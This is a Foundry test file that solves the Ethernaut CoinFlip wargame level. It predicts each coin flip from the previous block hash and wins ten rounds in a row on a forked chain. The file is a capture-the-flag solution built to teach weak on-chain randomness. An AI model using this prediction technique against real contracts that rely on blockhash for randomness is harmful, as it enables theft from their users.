// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import "../src/CoinFlip/CoinFlip.sol";

import "../src/Ethernaut.sol"; 


contract CoinflipTest is Test {

  function setUp() public {

    uint256 blockNumber = 6_000_000;
  
    string memory rpcUrl = vm.envString("eth_rpc_url");
    uint256 forkId = vm.createSelectFork(rpcUrl, blockNumber);
  
    assertEq(block.number, blockNumber);
  }

 

  function testCoinFlipHack() public {

    CoinFlip coinflip = new CoinFlip();

    uint256 initialBlockNumber = block.number - 1;
    bytes32 blockHash = blockhash(block.number - 1); 
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    

    for (uint i = 0; i < 10; i++) {
      vm.roll(initialBlockNumber + i + 1);

      console.log("Block number: ", block.number);
      console.logBytes32(blockHash);
      console.log("Wins before guessing:", coinflip.consecutiveWins());

      uint256 result = uint256(blockhash(block.number - 1)) / FACTOR;
      bool guess = result == 1 ? true : false;

      if (guess) {
        coinflip.flip(true);
      } else {
        coinflip.flip(false);
      }

      console.log("Wins after guessing:", coinflip.consecutiveWins());
      console.log("\n");

    }

    assertEq(coinflip.consecutiveWins(), 10);

  }
}